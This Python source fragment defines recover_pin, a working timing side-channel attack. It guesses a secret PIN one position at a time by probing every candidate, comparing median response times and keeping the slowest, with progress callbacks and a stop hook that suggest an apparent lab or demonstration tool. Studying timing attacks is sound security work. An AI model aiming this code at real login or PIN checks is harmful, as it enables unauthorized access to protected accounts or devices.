from .stats import median_time, best_candidate, confidence as _confidence


def recover_pin(
    probe: Probe,
    length: int,
    charset: str = "0123456789",
    samples: int = 15,
    on_position: Optional[Callable[[PositionReport], None]] = None,
    on_sample: Optional[Callable[[int, str, dict[str, float]], None]] = None,
    should_stop: Callable[[], bool] = lambda: False,
) -> Optional[RecoveryResult]:
    """Recover the PIN using only ``probe`` timings. Returns ``None`` if stopped."""
    recovered = ""
    total_requests = 0
    positions: list[PositionReport] = []
    filler = charset[0]

    for position in range(length):
        if should_stop():
            return None

        medians_us: dict[str, float] = {}

        for candidate in charset:
            if should_stop():
                return None

            pad_len = length - len(recovered) - 1
            guess = recovered + candidate + (filler * pad_len)

            timings: list[float] = []
            for _ in range(samples):
                if should_stop():
                    return None

                result = probe(guess)  # ProbeBlocked propagates on purpose
                total_requests += 1
                timings.append(result.elapsed_us)

                if result.success:
                    # Full PIN guessed correctly before we even finished
                    # sampling this candidate — stop immediately.
                    return RecoveryResult(
                        recovered=guess,
                        found_by_success=True,
                        total_requests=total_requests,
                        positions=positions,
                    )

            medians_us[candidate] = median_time(timings)

            if on_sample:
                on_sample(total_requests, recovered, dict(medians_us))

        chosen = best_candidate(medians_us)
        recovered += chosen

        report = PositionReport(
            position=position,
            recovered_so_far=recovered,
            medians_us=medians_us,
            chosen=chosen,
            confidence=_confidence(medians_us),
        )
        positions.append(report)

        if on_position:
            on_position(report)

    return RecoveryResult(
        recovered=recovered,
        found_by_success=False,
        total_requests=total_requests,
        positions=positions,
    )